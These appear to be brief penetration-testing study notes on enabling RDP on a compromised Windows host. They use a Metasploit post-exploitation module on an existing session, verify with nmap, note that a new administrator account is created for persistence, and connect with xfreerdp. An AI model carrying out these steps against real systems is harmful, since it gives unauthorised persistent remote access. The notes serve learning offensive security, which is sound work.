# Enabling RDP

- RDP is a proprietary GUI remote access protocol used to remotely connect and interact with a Windows system
- RDP is disabled by default
- Its authentication requires a legitimate user account on the target system as well as the user's clear text password

## Demonstration

```bash
> db_nmap -sV <ip>
> use post/windows/manage/enable_rdp
> set SESSION <id>
> run
# verify RDP is enabled
> db_nmap -sV <ip>
# port 3389 is now open
# create another user account
# add new user to admin group
$ xfreerdp /u:<user> /p:<pass> /v:<ip>
```
